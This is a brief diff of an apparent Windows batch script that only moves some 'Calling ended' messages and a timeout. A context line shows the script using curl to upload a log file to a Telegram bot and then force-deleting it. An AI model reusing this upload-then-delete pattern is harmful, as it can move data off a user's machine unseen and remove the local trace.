@@ -99,8 +99,6 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" ^
 
 
 echo.
-echo Calling ended.
-timeout /t 20 /nobreak
 del /f /q "%LOGFILE%"
 goto :EOF
 
@@ -373,6 +371,10 @@ set "MESSAGEEVERY=RUNEVERYINSTALLED...."
 
 :NEXT
 ::
+echo.
+echo Time= %time%
+echo Calling ended....
+timeout /t 10 /nobreak
 
 
 
